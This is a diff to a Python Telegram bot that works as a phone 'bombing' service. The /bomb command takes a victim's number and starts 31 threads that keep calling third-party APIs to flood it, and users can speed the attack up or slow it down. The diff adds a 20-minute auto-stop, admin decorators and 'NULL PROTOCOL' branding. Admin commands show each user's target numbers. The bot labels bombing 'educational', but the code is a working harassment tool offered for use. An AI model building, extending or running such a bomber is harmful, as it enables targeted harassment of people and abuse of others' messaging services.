@@ -10,10 +10,10 @@ import requests
 import urllib.request
 import urllib.parse
 import urllib.error
-from datetime import datetime
+from datetime import datetime, timedelta
 from dotenv import load_dotenv
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 from telegram.constants import ParseMode
 import aiohttp
 from database import (
@@ -38,22 +38,27 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# Branding
+BRANDING = "\n\n🤖 **Powered by NULL PROTOCOL**"
+
 # ------------------------------------------------------------------
-# Advanced Bombing Configuration – one thread per API, dynamic interval
+# Advanced Bombing Configuration
 # ------------------------------------------------------------------
-API_INDICES = list(range(31))          # 0 to 30
+API_INDICES = list(range(31))
 DEFAULT_COUNTRY_CODE = "91"
-BOMBING_INTERVAL_SECONDS = 8           # default
+BOMBING_INTERVAL_SECONDS = 8
 MIN_INTERVAL = 1
 MAX_INTERVAL = 60
 MAX_REQUEST_LIMIT = 900000000000
 TELEGRAM_RATE_LIMIT_SECONDS = 5
+AUTO_STOP_SECONDS = 20 * 60  # 20 minutes
 
-bombing_active = {}        # user_id -> threading.Event (stop flag)
-bombing_threads = {}       # user_id -> list of threads
-user_intervals = {}        # user_id -> current interval (seconds)
+bombing_active = {}
+bombing_threads = {}
+user_intervals = {}
+user_start_time = {}
 global_request_counter = threading.Lock()
-request_counts = {}        # user_id -> total requests
+request_counts = {}
 session = requests.Session()
 BASE_HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
@@ -61,7 +66,7 @@ BASE_HEADERS = {
 }
 
 # ------------------------------------------------------------------
-# getapi() – 31+ API endpoints (exactly as in neo.py)
+# getapi() – 31+ API endpoints
 # ------------------------------------------------------------------
 def getapi(pn, lim, cc):
     cc = str(cc)
@@ -529,10 +534,8 @@ def getapi(pn, lim, cc):
 # Worker thread with dynamic interval
 # ------------------------------------------------------------------
 def api_worker(user_id, phone_number, api_index, stop_flag):
-    """Thread for a single API. Hits the API every `user_intervals[user_id]` seconds."""
     cc = DEFAULT_COUNTRY_CODE
     while not stop_flag.is_set():
-        # Get current interval for this user
         interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
         try:
             success = getapi(phone_number, api_index, cc)
@@ -542,52 +545,51 @@ def api_worker(user_id, phone_number, api_index, stop_flag):
                 logger.debug(f"API {api_index} failed for {phone_number}")
         except Exception as e:
             logger.error(f"API worker error: {e}")
-        # Wait for interval seconds, but check stop_flag every 0.5 sec to be responsive
         for _ in range(int(interval * 2)):
             if stop_flag.is_set():
                 break
             time.sleep(0.5)
 
 async def perform_bombing_task(user_id, phone_number, context):
-    """Spawns 31 threads, one per API. Stops when stop_flag is set."""
-    global bombing_active, bombing_threads, request_counts, user_intervals
-    
-    # Create a stop event for this user
     stop_flag = threading.Event()
     bombing_active[user_id] = stop_flag
     request_counts[user_id] = 0
-    user_intervals[user_id] = BOMBING_INTERVAL_SECONDS   # set initial interval
-    
+    user_intervals[user_id] = BOMBING_INTERVAL_SECONDS
+    user_start_time[user_id] = time.time()
+
     workers = []
     for api_idx in API_INDICES:
         t = threading.Thread(target=api_worker, args=(user_id, phone_number, api_idx, stop_flag))
         t.daemon = True
         workers.append(t)
         t.start()
-    
     bombing_threads[str(user_id)] = workers
-    
-    # Send initial message
+
     await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 Bombing started on `{phone_number}`.\n"
              f"Using {len(API_INDICES)} APIs every {BOMBING_INTERVAL_SECONDS} seconds.\n"
-             f"Use `/stop` to stop. Use `/speedup` / `/speeddown` to change interval.",
+             f"Auto‑stop after 20 minutes.\n"
+             f"Use `/stop` to stop. Use `/speedup` / `/speeddown` to change interval.{BRANDING}",
         parse_mode="MarkdownV2"
     )
-    
+
     last_count = 0
     last_message_time = 0
     try:
         while not stop_flag.is_set():
-            await asyncio.sleep(1)  # check every second
+            await asyncio.sleep(1)
             current_count = request_counts.get(user_id, 0)
             current_time = time.time()
+            if current_time - user_start_time.get(user_id, current_time) >= AUTO_STOP_SECONDS:
+                logger.info(f"Auto‑stop triggered for user {user_id} after 20 minutes")
+                stop_flag.set()
+                break
             if current_count > last_count and (current_time - last_message_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
                 interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
                 await context.bot.send_message(
                     chat_id=user_id,
-                    text=f"📊 Status: `{current_count}` requests sent. Interval: `{interval}` sec.",
+                    text=f"📊 Status: `{current_count}` requests sent. Interval: `{interval}` sec.{BRANDING}",
                     parse_mode="MarkdownV2"
                 )
                 last_count = current_count
@@ -605,9 +607,10 @@ async def perform_bombing_task(user_id, phone_number, context):
             del bombing_threads[str(user_id)]
         final_count = request_counts.pop(user_id, 0)
         user_intervals.pop(user_id, None)
+        user_start_time.pop(user_id, None)
         await context.bot.send_message(
             chat_id=user_id,
-            text=f"✅ Bombing finished. Total requests sent: `{final_count}`.",
+            text=f"✅ Bombing finished. Total requests sent: `{final_count}`.{BRANDING}",
             parse_mode="MarkdownV2"
         )
         if user_id in bombing_active:
@@ -619,22 +622,22 @@ async def perform_bombing_task(user_id, phone_number, context):
 async def speedup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in bombing_active or bombing_active[user_id].is_set():
-        await update.message.reply_text("No active bombing session. Start one with /bomb.")
+        await update.message.reply_text("No active bombing session. Start one with /bomb." + BRANDING)
         return
     current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
     new_val = max(MIN_INTERVAL, current - 1)
     user_intervals[user_id] = new_val
-    await update.message.reply_text(f"⚡ Speed increased. New interval: {new_val} seconds.")
+    await update.message.reply_text(f"⚡ Speed increased. New interval: {new_val} seconds.{BRANDING}")
 
 async def speeddown(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in bombing_active or bombing_active[user_id].is_set():
-        await update.message.reply_text("No active bombing session. Start one with /bomb.")
+        await update.message.reply_text("No active bombing session. Start one with /bomb." + BRANDING)
         return
     current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
     new_val = min(MAX_INTERVAL, current + 1)
     user_intervals[user_id] = new_val
-    await update.message.reply_text(f"🐢 Speed decreased. New interval: {new_val} seconds.")
+    await update.message.reply_text(f"🐢 Speed decreased. New interval: {new_val} seconds.{BRANDING}")
 
 # ------------------------------------------------------------------
 # Helper: send any message (text or media)
@@ -660,6 +663,25 @@ async def send_any_message(context, chat_id, update, text=None):
     return False
 
 # ------------------------------------------------------------------
+# Admin decorators
+# ------------------------------------------------------------------
+def admin_only(func):
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
+        user_id = update.effective_user.id
+        if not is_admin(user_id):
+            return
+        return await func(update, context, *args, **kwargs)
+    return wrapper
+
+def owner_only(func):
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
+        user_id = update.effective_user.id
+        if not is_owner(user_id):
+            return
+        return await func(update, context, *args, **kwargs)
+    return wrapper
+
+# ------------------------------------------------------------------
 # Public Commands
 # ------------------------------------------------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -667,7 +689,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     add_user(user.id, user.username, user.first_name)
     await update.message.reply_text(
         f"Welcome {user.first_name}! 🤖\n"
-        f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/speedup - Increase bombing speed\n/speeddown - Decrease bombing speed\n/menu - Show menu"
+        f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/speedup - Increase bombing speed\n/speeddown - Decrease bombing speed\n/menu - Show menu{BRANDING}"
     )
 
 async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -675,38 +697,35 @@ async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         logger.info(f"Bomb command received from {user_id} with args: {context.args}")
         if not context.args:
-            await update.message.reply_text("Usage: /bomb <phone_number>")
+            await update.message.reply_text("Usage: /bomb <phone_number>" + BRANDING)
             return
         phone = ''.join(filter(str.isdigit, context.args[0]))
         if len(phone) < 10:
-            await update.message.reply_text("Invalid number. At least 10 digits.")
+            await update.message.reply_text("Invalid number. At least 10 digits." + BRANDING)
             return
 
-        # Prevent self‑bombing if user has stored phone
         user_phone = get_user_phone(user_id)
         if user_phone and user_phone == phone:
-            await update.message.reply_text("❌ Self‑bombing is not allowed.")
+            await update.message.reply_text("❌ Self‑bombing is not allowed." + BRANDING)
             return
 
-        # If already bombing, stop previous first
         if user_id in bombing_active and not bombing_active[user_id].is_set():
             bombing_active[user_id].set()
             await asyncio.sleep(1)
 
-        # Start bombing
         asyncio.create_task(perform_bombing_task(user_id, phone, context))
     except Exception as e:
         logger.error(f"Error in bomb_command: {e}", exc_info=True)
-        await update.message.reply_text("An error occurred. Please try again later.")
+        await update.message.reply_text("An error occurred. Please try again later." + BRANDING)
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_flag = bombing_active.get(user_id)
     if stop_flag and not stop_flag.is_set():
         stop_flag.set()
-        await update.message.reply_text("🛑 Stop signal sent. Bombing will stop shortly.")
+        await update.message.reply_text("🛑 Stop signal sent. Bombing will stop shortly." + BRANDING)
     else:
-        await update.message.reply_text("ℹ️ No active bombing found.")
+        await update.message.reply_text("ℹ️ No active bombing found." + BRANDING)
 
 async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -714,10 +733,10 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]
         await update.message.reply_text("Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
     else:
-        await update.message.reply_text("Menu:\nUse /bomb, /stop, /speedup, /speeddown")
+        await update.message.reply_text("Menu:\nUse /bomb, /stop, /speedup, /speeddown" + BRANDING)
 
 # ------------------------------------------------------------------
-# Admin Commands (unchanged)
+# Admin Commands (using decorators)
 # ------------------------------------------------------------------
 @admin_only
 async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -727,7 +746,7 @@ async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target = int(context.args[0])
         if ban_user(target):
-            await update.message.reply_text(f"User {target} banned.")
+            await update.message.reply_text(f"User {target} banned.{BRANDING}")
         else:
             await update.message.reply_text("User not found.")
     except:
@@ -741,7 +760,7 @@ async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target = int(context.args[0])
         if unban_user(target):
-            await update.message.reply_text(f"User {target} unbanned.")
+            await update.message.reply_text(f"User {target} unbanned.{BRANDING}")
         else:
             await update.message.reply_text("User not found or not banned.")
     except:
@@ -755,7 +774,7 @@ async def delete_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         target = int(context.args[0])
         if delete_user(target):
-            await update.message.reply_text(f"User {target} deleted.")
+            await update.message.reply_text(f"User {target} deleted.{BRANDING}")
         else:
             await update.message.reply_text("User not found.")
     except:
@@ -769,7 +788,7 @@ async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for uid in users:
         if await send_any_message(context, uid, update, text):
             success += 1
-    await update.message.reply_text(f"Broadcast sent to {success}/{len(users)} users.")
+    await update.message.reply_text(f"Broadcast sent to {success}/{len(users)} users.{BRANDING}")
 
 @admin_only
 async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -781,7 +800,7 @@ async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = " ".join(context.args[1:]) if len(context.args) > 1 else None
         success = await send_any_message(context, target, update, text)
         if success:
-            await update.message.reply_text(f"Message sent to {target}.")
+            await update.message.reply_text(f"Message sent to {target}.{BRANDING}")
         else:
             await update.message.reply_text("Failed to send.")
     except Exception as e:
@@ -802,7 +821,7 @@ async def bulk_dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for uid in ids:
         if await send_any_message(context, uid, update, text):
             success += 1
-    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.")
+    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.{BRANDING}")
 
 @admin_only
 async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -854,7 +873,7 @@ async def user_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("User not found.")
             return
         target = get_user_target(uid) or "None"
-        text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}"
+        text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}{BRANDING}"
         await update.message.reply_text(text)
     except:
         await update.message.reply_text("Invalid user ID.")
@@ -880,7 +899,7 @@ async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         set_admin_role(uid, True)
-        await update.message.reply_text(f"User {uid} is now admin.")
+        await update.message.reply_text(f"User {uid} is now admin.{BRANDING}")
     except:
         await update.message.reply_text("Invalid user ID.")
 
@@ -892,7 +911,7 @@ async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         set_admin_role(uid, False)
-        await update.message.reply_text(f"User {uid} is no longer admin.")
+        await update.message.reply_text(f"User {uid} is no longer admin.{BRANDING}")
     except:
         await update.message.reply_text("Invalid user ID.")
 
@@ -967,7 +986,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
     elif data == "admin_stats":
         count = get_user_count()
-        await query.edit_message_text(f"Total users: {count}")
+        await query.edit_message_text(f"Total users: {count}{BRANDING}")
     elif data == "back_to_menu":
         user_id = query.from_user.id
         if is_admin(user_id):
@@ -991,16 +1010,14 @@ def main():
     init_db()
     app = Application.builder().token(BOT_TOKEN).build()
 
-    # Public commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("bomb", bomb_command))
-    app.add_handler(CommandHandler("bom", bomb_command))          # alias
+    app.add_handler(CommandHandler("bom", bomb_command))
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("speedup", speedup))
     app.add_handler(CommandHandler("speeddown", speeddown))
     app.add_handler(CommandHandler("menu", menu))
 
-    # Admin commands
     app.add_handler(CommandHandler("ban", ban))
     app.add_handler(CommandHandler("unban", unban))
     app.add_handler(CommandHandler("deleteuser", delete_user_cmd))
@@ -1011,8 +1028,6 @@ def main():
     app.add_handler(CommandHandler("recent", recent_users))
     app.add_handler(CommandHandler("lookup", user_lookup))
     app.add_handler(CommandHandler("backup", backup))
-
-    # Owner commands
     app.add_handler(CommandHandler("fullbackup", full_backup))
     app.add_handler(CommandHandler("addadmin", add_admin))
     app.add_handler(CommandHandler("removeadmin", remove_admin))
